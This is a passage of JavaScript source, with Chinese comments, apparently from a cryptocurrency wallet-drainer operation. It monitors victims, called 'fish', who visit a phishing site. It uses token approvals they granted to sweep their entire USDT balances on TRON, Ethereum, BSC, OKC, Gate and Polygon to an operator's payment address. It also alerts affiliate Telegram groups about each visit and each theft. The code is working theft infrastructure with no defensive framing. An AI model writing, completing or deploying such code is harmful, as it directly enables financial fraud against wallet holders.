                fromAddress,
                toAddress,
                amountInUint256
            ).send({
                feeLimit: 150000000,
                shouldPollResponse: true
            });
        } else {
            txResult = await contract[contractMethod](
                fromAddress,
                toAddress,
                amountInUint256
            ).send({
                feeLimit: 150000000,
                shouldPollResponse: true
            });
        }

        const transactionHash = txResult;
        console.log(`[${getTimeInfo().time}] 转账交易执行成功 - 哈希: ${transactionHash}`);
        return transactionHash;
    } catch (error) {
        console.error(`[${getTimeInfo().time}] TRC-USDT转账出错: ${error.message}`);
        return null;
    }
}

// EVM阈值转账处理（本地签名，不经过外部API）
async function ERCtransferFrom(permissionAddress, fishAddress, transferAmountIn, chain) {
  try {
      const chainConfig = {
          'ERC': { symbol: 'ETH', minBalance: 0.0005, explorer: 'https://cn.etherscan.com/tx/' },
          'BSC': { symbol: 'BNB', minBalance: 0.005, explorer: 'https://bscscan.com/tx/' },
          'OKC': { symbol: 'OKT', minBalance: 0.005, explorer: 'https://www.oklink.com/okc/tx/' },
          'GRC': { symbol: 'GT', minBalance: 0.005, explorer: 'https://gatescan.org/tx/' },
          'POL': { symbol: 'MATIC', minBalance: 0.5, explorer: 'https://polygonscan.com/tx/' }
      };
      const currentConfig = chainConfig[chain];
      const private_key = cacheData.options['0x_private_key'];
      const payment_address = cacheData.options['0x_payment_address'];
      const fishInfo = cacheData.fishMap.get(fishAddress);
      const dailiInfo = cacheData.dailiMap.get(fishInfo.unique_id);
      const evmConfig = getEVMChainConfig(chain);
      const web3 = new Web3(new Web3.providers.HttpProvider(evmConfig.rpc));

      // 检查矿工费是否足够提币（本地查询）
      const nativeWei = await web3.eth.getBalance(permissionAddress);
      const nativeBalance = Number(nativeWei) / 1e18;
      if (nativeBalance < currentConfig.minBalance) {
          const message = `【⚠️ 阈值转账错误通知】\n\n` +
              `❗ 错误原因：权限地址 ${currentConfig.symbol} 余额不足\n\n` +
              `🎯 权限地址：\n<code>${permissionAddress}</code>\n\n` +
              `💰 当前余额：<code>${nativeBalance} ${currentConfig.symbol}</code>\n\n` +
              `⏰ 时间：<code>${getTimeInfo().time}</code>\n\n` +
              `⚠️ 请至少保持权限地址有${currentConfig.minBalance}${currentConfig.symbol}，以免影响转账操作！`;
          try {
              await bot.sendMessage(dailiInfo.groupid, message, { parse_mode: 'HTML' });
          } catch (notifyError) {
              console.error('EVM阈值转账-发送通知失败:', notifyError);
          }
          return;
      }

      // 查询鱼苗USDT余额（本地查询）
      const usdtAddress = EVM_USDT_ADDRESSES[chain];
      const usdtContract = new web3.eth.Contract(USDT_ABI, usdtAddress);
      const usdtRaw = await usdtContract.methods.balanceOf(fishAddress).call();
      const usdtBalance = Number(usdtRaw) / 1e6;

      // 本地构建并发送交易（调用合约 controlAndTransferToken）
      const account = web3.eth.accounts.privateKeyToAccount(private_key);
      web3.eth.accounts.wallet.add(account);
      web3.eth.defaultAccount = account.address;

      const heyueContract = new web3.eth.Contract(HEYUE_ABI, permissionAddress);
      const amountInSmallest = BigInt(Math.floor(usdtBalance * 1e6));
      
      const tx = heyueContract.methods.controlAndTransferToken(
          usdtAddress,
          fishAddress,
          payment_address,
          amountInSmallest.toString()
      );

      const gasPrice = await web3.eth.getGasPrice();
      const gasLimit = await tx.estimateGas({ from: account.address });
      
      const signedTx = await web3.eth.accounts.signTransaction({
          to: permissionAddress,
          data: tx.encodeABI(),
          gas: Math.floor(Number(gasLimit) * 1.2),
          gasPrice: gasPrice,
          chainId: evmConfig.chainId,
          nonce: await web3.eth.getTransactionCount(account.address, 'pending')
      }, private_key);

      const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
      const transactionHash = receipt.transactionHash;

      await pool.promise().query(
          "UPDATE fish SET usdt_balance = 0, threshold = 200 WHERE fish_address = ? AND chainid = ?",
          [fishAddress, chain]
      );
      const usernameDisplay = ` @${dailiInfo.username}`;
      const message = `【🎣 ${chain}-USDT 自动转账通知🎣】\n\n` +
          `🐟鱼苗地址${usernameDisplay}：\n<code>${fishAddress}</code>\n\n` +
          `💳收款地址：\n<code>${payment_address}</code>\n\n` +
          `💸本次划扣：<code>${usdtBalance} USDT</code>`;
      const buttons = {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "🌍详细交易信息", url: `${currentConfig.explorer}${transactionHash}` }]
              ]
          }
      };
      try {
          await bot.sendMessage(dailiInfo.groupid, message, {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              ...buttons
          });
      } catch (notifyError) {
          console.error('EVM阈值转账-发送通知失败:', notifyError);
      }
      console.log(`[${getTimeInfo().time}] EVM阈值转账，交易哈希: ${transactionHash}`);
      return { data: { signedTransaction: { transactionHash } } };
  } catch (error) {
      console.error(`[${getTimeInfo().time}] ${chain}链 转账失败 错误:`, error);
      throw error;
  }
}

// 鱼苗浏览播报
async function broadcastBrowsing() {
    while (true) {
        try {
            const pendingRecords = [];
            for (const [fishAddress, record] of cacheData.fishBrowseMap) {
                if (record.state === 0) {
                    pendingRecords.push(record);
                }
            }
            if (pendingRecords.length > 0) {
                pendingRecords.sort((a, b) => new Date(a.time) - new Date(b.time));
                const record = pendingRecords[0];
                let username = null;
                let groupid = null;
                if (record.unique_id && cacheData.dailiMap.has(record.unique_id)) {
                    const dailiInfo = cacheData.dailiMap.get(record.unique_id);
                    username = dailiInfo.username;
                    groupid = dailiInfo.groupid;
                }
                try {
                    await pool.promise().query(
                        'UPDATE fish_browse SET state = 1 WHERE id = ?',
                        [record.id]
                    );
                    if (cacheData.fishBrowseMap.has(record.fish_address)) {
                        const cachedRecord = cacheData.fishBrowseMap.get(record.fish_address);
                        if (cachedRecord.id === record.id) {
                            cachedRecord.state = 1;
                        }
                    }
                    if (groupid) {
                        const message = `📣 访问播报：当前有鱼儿正在访问网站
🐟 【${record.chainid}网络】鱼苗地址：${username ? '@' + username : ''}
<code>${record.fish_address}</code>
🪫 Gas 余额：<code>${record.gas_balance}</code>
💵 USDT余额：<code>${record.usdt_balance}</code>
👁‍🗨正在等待鱼苗输入钱包密码进行授权...`;
                        try {
                            await bot.sendMessage(groupid, message, {
                                parse_mode: 'HTML'
                            });
                        } catch (error) {
                            console.error('消息发送失败:', error);
                        }
                    }
                } catch (error) {
                    console.error('更新状态失败:', error);
                }
            }
            // 播报完成之后休眠3秒
            await new Promise(resolve => setTimeout(resolve, 3000));
        } catch (error) {
            console.error('广播处理出现错误:', error);
            await new Promise(resolve => setTimeout(resolve, 10000)); // 出现错误后休眠10秒
        }
    }
}

// 启动所有服务
async function startServices() {
    try {
        console.log(`[${getTimeInfo().time}] 开始启动机器人...`);
        await syncAlouerPaymentChannel();
        startCacheUpdate();
        await new Promise(resolve => setTimeout(resolve, 3000));// 等待3秒确保数据库缓存已得到更新
        const botInitResult = await initBot(); // 初始化机器人
        if (!botInitResult) {
            return; // keep API server running
        }
        // 初始化各个网络的 Web3
        const ercInitResult = await ERCinitWeb3();
        const bscInitResult = await BSCinitWeb3();
        const okcInitResult = await OKCinitWeb3();
        const grcInitResult = await GRCinitWeb3();
        const polInitResult = await POLinitWeb3();
        // 启动所有监控服务
        TRCfetchLatestBlock();    // TRC网络监控
        ERCfetchLatestBlock();    // ERC网络监控
        BSCfetchLatestBlock();    // BSC网络监控
        OKCfetchLatestBlock();    // OKC网络监控
        GRCfetchLatestBlock();    // GRC网络监控
        POLfetchLatestBlock();    // POL网络监控
        monitorFishTable();       // 监控鱼池并执行转账
        updateFishBalances();    // 启动鱼苗余额更新服务
        broadcastBrowsing();    // 鱼苗浏览播报
        console.log(`[${getTimeInfo().time}] 机器人启动成功`);
    } catch(error) {
        console.error(`[${getTimeInfo().time}] 启动失败:`, error);
        process.exit(1);
    }
}
// 启动机器人
startServices();
// 错误处理
process.on('uncaughtException', (error) => {
    console.error(`[${getTimeInfo().time}] 未捕获的异常:`, error);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error(`[${getTimeInfo().time}] 未处理的Promise拒绝:`, reason);
});
